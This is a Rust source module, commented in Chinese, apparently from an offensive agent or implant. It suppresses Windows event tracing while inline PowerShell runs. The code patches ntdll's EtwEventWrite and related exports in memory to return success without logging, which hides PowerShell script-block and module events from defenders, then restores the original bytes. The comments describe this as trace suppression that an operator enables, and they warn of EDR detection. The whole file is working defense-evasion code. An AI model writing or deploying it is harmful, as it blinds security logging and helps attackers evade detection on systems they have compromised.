//! ETW 痕迹抑制（瞬态 patch）。
//!
//! inline PowerShell 在宿主进程内执行时，PowerShell 引擎会把 ScriptBlock /
//! Module / 引擎生命周期事件通过 `Microsoft-Windows-PowerShell` ETW provider
//! 写入事件日志（Event Log 4104/4103/400/403 等）。这些事件最终经
//! `ntdll!EtwEventWrite` 系列导出落地。
//!
//! 本模块在宿主进程（agent）内瞬态 patch ntdll 的 ETW 导出：
//!   1. stub 执行前 `suppress()` —— 所有 Etw* 调用直接返回成功（不落日志）
//!   2. 执行完（含错误路径）`Drop` 自动 `restore()` 原始字节
//!
//! 安全与检测面（重要）：
//! - 只 patch **自己进程**的 ntdll（无跨进程 OpenProcess/WriteProcessMemory），
//!   但改写系统 DLL 代码段本身是 EDR 行为检测的高危信号（与 AMSI patch 同级）。
//! - 因此默认**关闭**，由操作员显式开启（`etwSuppress: true`），且仅在确认
//!   目标环境后使用；开启后请勿在未隔离的 Defender 环境做行为验证。
//! - patch 范围限于执行窗口（毫秒级），执行后完整恢复。

#![allow(non_snake_case)]

use std::ffi::c_void;

#[link(name = "kernel32")]
extern "system" {
    fn GetModuleHandleA(name: *const u8) -> *mut c_void;
    fn GetProcAddress(module: *mut c_void, name: *const u8) -> *const c_void;
    fn VirtualProtect(addr: *mut c_void, size: usize, new_protect: u32, old: *mut u32) -> i32;
}

const PAGE_EXECUTE_READWRITE: u32 = 0x40;

/// `xor eax, eax; ret` —— Etw* 函数直接返回 STATUS_SUCCESS。
const ETW_PATCH: [u8; 3] = [0x33, 0xC0, 0xC3];

/// ntdll 中与事件写入相关的导出（PowerShell 5.1 及 .NET CLR 的 EventSource
/// 主要走 EtwEventWrite / EtwEventWriteEx；其余为覆盖变体）。
const ETW_EXPORTS: &[&[u8]] = &[
    b"EtwEventWrite\0",
    b"EtwEventWriteEx\0",
    b"EtwEventWriteString\0",
    b"EtwEventWriteTransfer\0",
    b"EtwWrite\0",
    b"EtwWriteEx\0",
    b"EtwWriteString\0",
    b"EtwWriteTransfer\0",
];

/// 已保存的原始字节（地址 → 原字节 + 原保护属性）。
struct SavedPatch {
    addr: *mut u8,
    original: [u8; 3],
    old_protect: u32,
}

/// 瞬态 ETW 抑制器：`suppress()` 打补丁，Drop 时自动恢复。
pub struct EtwSuppressor {
    saved: Vec<SavedPatch>,
}

impl EtwSuppressor {
    /// patch 当前进程 ntdll 的 ETW 导出。失败（如导出缺失）不致命——
    /// 已成功的项照常恢复。
    pub fn suppress() -> Option<Self> {
        #[cfg(target_os = "windows")]
        {
            unsafe {
                let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
                if ntdll.is_null() {
                    return None;
                }
                let mut saved = Vec::new();
                for export in ETW_EXPORTS {
                    let addr = GetProcAddress(ntdll, export.as_ptr());
                    if addr.is_null() {
                        continue;
                    }
                    let target = addr as *mut u8;
                    let mut old_protect: u32 = 0;
                    if VirtualProtect(
                        target as *mut c_void,
                        ETW_PATCH.len(),
                        PAGE_EXECUTE_READWRITE,
                        &mut old_protect,
                    ) == 0
                    {
                        continue;
                    }
                    let mut original = [0u8; 3];
                    std::ptr::copy_nonoverlapping(target, original.as_mut_ptr(), 3);
                    std::ptr::copy_nonoverlapping(ETW_PATCH.as_ptr(), target, 3);
                    saved.push(SavedPatch { addr: target, original, old_protect });
                }
                if saved.is_empty() {
                    return None;
                }
                Some(EtwSuppressor { saved })
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = ();
            None
        }
    }

    /// 恢复原始字节与保护属性。失败静默（agent 自身不使用 ETW）。
    pub fn restore(&mut self) {
        #[cfg(target_os = "windows")]
        unsafe {
            for p in self.saved.drain(..) {
                let mut tmp_protect: u32 = 0;
                VirtualProtect(
                    p.addr as *mut c_void,
                    p.original.len(),
                    PAGE_EXECUTE_READWRITE,
                    &mut tmp_protect,
                );
                std::ptr::copy_nonoverlapping(p.original.as_ptr(), p.addr, p.original.len());
                VirtualProtect(p.addr as *mut c_void, p.original.len(), p.old_protect, &mut tmp_protect);
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            self.saved.clear();
        }
    }
}

impl Drop for EtwSuppressor {
    fn drop(&mut self) {
        self.restore();
    }
}

#[cfg(all(test, target_os = "windows"))]
mod tests {
    use super::*;

    /// 验证 patch 后 EtwEventWrite 返回 0（STATUS_SUCCESS）且 restore 后恢复。
    /// 注意：改写 ntdll 代码段会触发 Defender 行为检测，
    /// 必须仅在隔离环境运行（`cargo test -- --ignored`）。
    #[test]
    #[ignore = "rewrites ntdll code — isolated environment only"]
    fn suppress_and_restore_roundtrip() {
        extern "system" {
            fn EtwEventWrite(
                reg_handle: *mut c_void,
                event_descriptor: *mut c_void,
                user_data_count: u32,
                user_data: *mut c_void,
            ) -> i32;
        }

        unsafe {
            let mut suppressor = EtwSuppressor::suppress().expect("suppress failed");
            // patch 后调用应直接返回 0
            let hr = EtwEventWrite(std::ptr::null_mut(), std::ptr::null_mut(), 0, std::ptr::null_mut());
            assert_eq!(hr, 0, "EtwEventWrite should be suppressed (hr={hr})");

            suppressor.restore();
            // restore 后调用走真实实现（参数无效 → 非 0）
            let hr2 = EtwEventWrite(std::ptr::null_mut(), std::ptr::null_mut(), 0, std::ptr::null_mut());
            assert_ne!(hr2, 0, "EtwEventWrite should be restored (hr={hr2})");
        }
    }
}
